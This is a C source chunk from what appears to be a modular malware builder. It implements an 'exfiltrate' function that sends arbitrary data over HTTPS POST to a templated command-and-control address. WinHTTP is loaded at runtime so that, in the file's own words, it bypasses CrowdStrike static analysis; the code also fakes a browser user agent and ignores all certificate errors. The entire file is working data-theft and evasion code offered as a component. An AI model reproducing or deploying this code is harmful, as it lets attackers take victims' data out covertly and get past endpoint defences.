// chunk: exfil/https_dynamic
// depends: core/emit_buffer
// provides: exfiltrate
// note: Dynamic winhttp.dll loading - HTTPS POST with TLS, bypasses CrowdStrike static analysis

#ifndef CHUNK_HTTPS_DYNAMIC
#define CHUNK_HTTPS_DYNAMIC

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

typedef LPVOID (WINAPI *fn_WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef LPVOID (WINAPI *fn_WinHttpConnect)(LPVOID, LPCWSTR, WORD, DWORD);
typedef LPVOID (WINAPI *fn_WinHttpOpenRequest)(LPVOID, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL (WINAPI *fn_WinHttpSendRequest)(LPVOID, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *fn_WinHttpReceiveResponse)(LPVOID, LPVOID);
typedef BOOL (WINAPI *fn_WinHttpCloseHandle)(LPVOID);
typedef BOOL (WINAPI *fn_WinHttpSetTimeouts)(LPVOID, int, int, int, int);
typedef BOOL (WINAPI *fn_WinHttpSetOption)(LPVOID, DWORD, LPVOID, DWORD);

#define WINHTTP_FLAG_SECURE 0x00800000
#define WINHTTP_OPTION_SECURITY_FLAGS 31
#define SECURITY_FLAG_IGNORE_ALL 0x00003300

static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
    if (!data || len == 0) return FALSE;

    HMODULE wh = LoadLibraryA("winhttp.dll");
    if (!wh) return FALSE;

    fn_WinHttpOpen pOpen = (fn_WinHttpOpen)GetProcAddress(wh, "WinHttpOpen");
    fn_WinHttpConnect pConnect = (fn_WinHttpConnect)GetProcAddress(wh, "WinHttpConnect");
    fn_WinHttpOpenRequest pOpenReq = (fn_WinHttpOpenRequest)GetProcAddress(wh, "WinHttpOpenRequest");
    fn_WinHttpSendRequest pSendReq = (fn_WinHttpSendRequest)GetProcAddress(wh, "WinHttpSendRequest");
    fn_WinHttpReceiveResponse pRecvResp = (fn_WinHttpReceiveResponse)GetProcAddress(wh, "WinHttpReceiveResponse");
    fn_WinHttpCloseHandle pClose = (fn_WinHttpCloseHandle)GetProcAddress(wh, "WinHttpCloseHandle");
    fn_WinHttpSetTimeouts pTimeouts = (fn_WinHttpSetTimeouts)GetProcAddress(wh, "WinHttpSetTimeouts");
    fn_WinHttpSetOption pSetOpt = (fn_WinHttpSetOption)GetProcAddress(wh, "WinHttpSetOption");

    if (!pOpen || !pConnect || !pOpenReq || !pSendReq || !pClose) {
        FreeLibrary(wh);
        return FALSE;
    }

    wchar_t wip[64];
    MultiByteToWideChar(CP_ACP, 0, ip, -1, wip, 64);

    LPVOID session = pOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 0, NULL, NULL, 0);
    if (!session) {
        FreeLibrary(wh);
        return FALSE;
    }

    if (pTimeouts) pTimeouts(session, 15000, 15000, 15000, 30000);

    LPVOID conn = pConnect(session, wip, (WORD)port, 0);
    if (!conn) {
        pClose(session);
        FreeLibrary(wh);
        return FALSE;
    }

    LPVOID req = pOpenReq(conn, L"POST", L"/upload", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!req) {
        pClose(conn);
        pClose(session);
        FreeLibrary(wh);
        return FALSE;
    }

    // Ignore cert errors (self-signed)
    if (pSetOpt) {
        DWORD flags = SECURITY_FLAG_IGNORE_ALL;
        pSetOpt(req, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
    }

    BOOL ok = pSendReq(req, L"Content-Type: application/octet-stream\r\n", -1, (LPVOID)data, len, len, 0);
    if (ok && pRecvResp) pRecvResp(req, NULL);

    pClose(req);
    pClose(conn);
    pClose(session);
    FreeLibrary(wh);

    return ok;
}

#endif
